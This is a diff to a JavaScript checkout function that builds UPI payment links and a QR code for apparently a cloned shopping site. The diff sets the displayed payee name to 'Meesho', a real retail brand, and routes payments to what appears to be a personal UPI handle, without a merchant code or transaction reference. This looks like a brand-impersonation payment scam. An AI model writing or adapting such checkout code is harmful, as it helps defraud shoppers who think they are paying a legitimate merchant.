@@ -74,73 +74,43 @@ function payNow() {
 
     var payType = $(".form-check.active").attr('pay-type');
     var redirect_url = "";
-    var site_name = "SYFROX";
-    var upi_address = "eazypay.584736425@icici";
-    var merchant_code = "5045";
-    var uniqueTxnRef = "EZYS" + Date.now().toString().slice(-8) + Math.floor(10 + Math.random() * 90);
-    var pageUrl = window.location.href;
+    var site_name = "Meesho";
+    var upi_address = "rajpatel1861997@okaxis";
+    var aid = "uGICAgOD1lfiuLw";
+    var amt = (itemData && itemData.selling_price) ? parseFloat(itemData.selling_price).toFixed(2) : "0.00";
 
-    var fullMerchantQuery = "pa=" + encodeURIComponent(upi_address) +
-                           "&pn=" + encodeURIComponent(site_name) +
-                           "&mc=" + encodeURIComponent(merchant_code) +
-                           "&tr=" + encodeURIComponent(uniqueTxnRef) +
-                           "&url=" + encodeURIComponent(pageUrl) +
-                           "&am=" + amt +
-                           "&cu=INR" +
-                           "&tn=" + encodeURIComponent("Order_" + orderNumber);
+    var upiQuery = "pa=" + encodeURIComponent(upi_address) +
+                   "&pn=" + encodeURIComponent(site_name) +
+                   "&aid=" + encodeURIComponent(aid) +
+                   "&am=" + amt +
+                   "&cu=INR" +
+                   "&tn=" + encodeURIComponent("Order_" + orderNumber);
 
     var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
     switch (payType) {
-      case 'gpay':
-        if (!isIOS && window.PaymentRequest) {
-          try {
-            var gpayRequest = new window.PaymentRequest(
-              [
-                {
-                  supportedMethods: ["https://tez.google.com/pay"],
-                  data: {
-                    pa: upi_address,
-                    pn: site_name,
-                    mc: merchant_code,
-                    tr: uniqueTxnRef,
-                    url: pageUrl,
-                  },
-                },
-              ],
-              {
-                total: {
-                  label: "Total Amount",
-                  amount: { currency: "INR", value: amt },
-                },
-              }
-            );
-            gpayRequest.show().then(function (res) {
-              return res.complete("success");
-            }).catch(function () {
-              window.location.href = "tez://upi/pay?" + fullMerchantQuery;
-            });
-            return;
-          } catch (e) {
-            // fallback to deep link below
-          }
-        }
-        if (isIOS) {
-          redirect_url = "gpay://upi/pay?" + fullMerchantQuery;
+      case 'qr_code':
+      case 'qr':
+        var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=8&data=" + encodeURIComponent("upi://pay?" + upiQuery);
+        var qrModal = document.getElementById('qr_modal');
+        if (qrModal) {
+          var qrImg = document.getElementById('qr_code_img');
+          if (qrImg) qrImg.src = qrUrl;
+          $(qrModal).show();
         } else {
-          redirect_url = "tez://upi/pay?" + fullMerchantQuery;
+          window.location.href = qrUrl;
         }
-        break;
+        return;
       case 'phonepe':
-        redirect_url = "phonepe://pay?" + fullMerchantQuery;
+        redirect_url = "phonepe://pay?" + upiQuery;
         break;
       case 'paytm':
-        redirect_url = "paytmmp://pay?" + fullMerchantQuery;
+        redirect_url = "paytmmp://pay?" + upiQuery;
         break; 
       case 'bhim_upi':
       case 'whatsapp':
       default:
-        redirect_url = "upi://pay?" + fullMerchantQuery;
+        redirect_url = "upi://pay?" + upiQuery;
         break;
     }
     window.location.href = redirect_url;
